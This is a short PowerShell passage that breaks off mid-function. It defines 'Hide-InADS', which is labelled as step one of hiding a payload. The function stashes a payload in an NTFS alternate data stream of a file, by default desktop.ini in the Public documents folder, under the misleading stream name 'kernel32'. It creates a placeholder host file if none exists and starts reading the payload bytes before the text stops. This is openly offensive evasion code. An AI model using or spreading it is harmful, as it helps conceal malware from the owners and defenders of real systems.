# 1. Hide payload in ADS of an existing file
function Hide-InADS {
    param(
        [string]$HostFile = "C:\Users\Public\Documents\desktop.ini",
        [string]$StreamName = "kernel32",
        [string]$PayloadPath = ""
    )

    if (-not (Test-Path $HostFile)) {
        "Placeholder" | Set-Content $HostFile
    }

    if ($PayloadPath -and (Test-Path $PayloadPath)) {
        # Hide a file
        $data = [IO.File]::ReadAllBytes($PayloadPath)
